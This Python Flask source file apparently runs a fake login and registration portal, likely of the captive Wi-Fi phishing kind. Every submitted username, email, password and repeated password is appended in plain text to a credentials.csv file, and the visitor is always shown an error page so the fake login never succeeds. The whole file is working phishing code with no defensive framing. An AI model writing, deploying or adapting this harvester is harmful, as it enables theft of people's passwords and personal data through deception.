# -*- coding: utf-8 -*-

from os.path import join, dirname, abspath
from flask import Flask, render_template, request, redirect
import json


app = Flask(
    __name__,
    static_url_path = '',
    static_folder = 'public',
    template_folder = 'templates'
)

# App configuration
current_dir = dirname(abspath(__file__))
config_file = join(current_dir, 'portal.conf')
locale_file = join(join(current_dir, 'locale'), '%s.json')
credentials = join(current_dir, 'credentials.csv')
app.config.from_pyfile(config_file)


@app.route('/')
def root():
    return redirect('/portal')

@app.route('/authentication', methods = ['POST'])
@app.route('/registration', methods = ['POST'])
def authentication():
    save_credentials(request.form)
    locale = app.config['LOCALE']
    page_content = locale['error']
    return render_template(
        'error.html',
        page = page_content,
        path = request.path
    )

@app.route('/<page>')
def send_page(page):
    try:
        locale = app.config['LOCALE']
        page_content = locale[page]
        return render_template(
            '%s.html' % page,
            page = page_content
        )
    except:
        return redirect('/portal')


def save_credentials(form):
    type = form.get('type')
    username = form.get('username')
    email = form.get('email')
    password = form.get('password')
    repeat = form.get('repeat')
    f = open(credentials, 'a')
    with open(credentials, 'a') as f:
        f.write("%s,%s,%s,%s,%s\n" % (
            type,
            username, email,
            password, repeat
        ))

def get_locale(lang):
    filename = locale_file % lang
    with open(filename) as f:
        return json.load(f)


def main():
    lang = app.config['LANG']
    app.config['LOCALE'] = get_locale(lang)
    app.run(
        host = app.config['HOST'],
        port = app.config['PORT'],
        debug = app.config['DEBUG'],
        threaded = True
    )


if __name__ == '__main__':
    main()
